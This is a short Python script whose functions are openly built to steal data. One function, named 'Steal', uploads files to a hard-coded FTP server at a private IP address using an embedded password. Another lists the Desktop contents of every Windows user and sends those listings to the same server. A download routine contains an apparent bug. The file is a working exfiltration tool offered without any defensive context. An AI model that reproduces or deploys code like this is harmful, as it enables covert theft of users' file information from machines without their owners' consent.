import ftplib
import os



def Steal(filename):
    ip = '172.23.7.161' # insert ip address
    port = 2002
    username = '' # insert username
    password = 'tungratog12' # insert password

    ftp = ftplib.FTP() # annouce FTP object
    ftp.connect(ip, port)
    ftp.login(username, password)


    local_path = os.getcwd()
    mypath = '/home/dimon/Documents/' # insert path from server
    ftp.cwd(mypath) # change working directory

    files = ftp.nlist() # list all the files in folder
    print('BEFORE: ', files)



    file_path = os.path.join(local_path, filename)
    fileupload = open(file_path, 'rb')

    result = ftp.storbinary('STOR ' + filename, fileupload) # send files via ftp to server

    print(result)


    files = ftp.nlist() # list all the files in folder
    print('AFTER: ', files)
    ftp.close()


# Steal('test.txt')


def scanDesktop(paht='Desktop', upload=False):
    folder_start = r'C:\Users'
    system_folder = ['All Users', 'CAT', 'Default', 'Default User', 'desktop.ini', 'Public']

    users_folder = os.listdir(folder_start)

    for u in users_folder:
        if u not in system_folder:
            try:
                userpath = os.path.join(folder_start, u)
                desktop = os.path.join(userpath, 'Desktop')
                print('Desktop: ', desktop)
                print(os.listdir(desktop))

                desktop_list = os.listdir(desktop)

                for d in desktop_list:
                    folder = os.path.join(desktop, d)
                    filename = '{}-desktop.txt'.format(u.replace(' ', '-'))
                    with open(filename, 'a', encoding='utf-8') as file:
                        t = '{}\n'.format(folder)
                        file.write(t)
                if upload:
                    Steal(filename)

            except:
                pass


def download(filename):
    ip = '172.23.7.161' # insert ip address
    port = 2002
    username = '' # insert username
    password = 'tungratog12' # insert password

    ftp = ftplib.FTP() # annouce FTP object
    ftp.connect(ip, port)
    ftp.login(username, password)


    local_path = os.getcwd()
    mypath = '/home/dimon/Documents/' # insert path from server
    ftp.cwd(mypath) # change working directory

    with open('uploadlist-local.txt', 'wb') as fp:
        ftp.retrbinary('RETR up uploadfile.txt', fp.write())

    ftp.close()

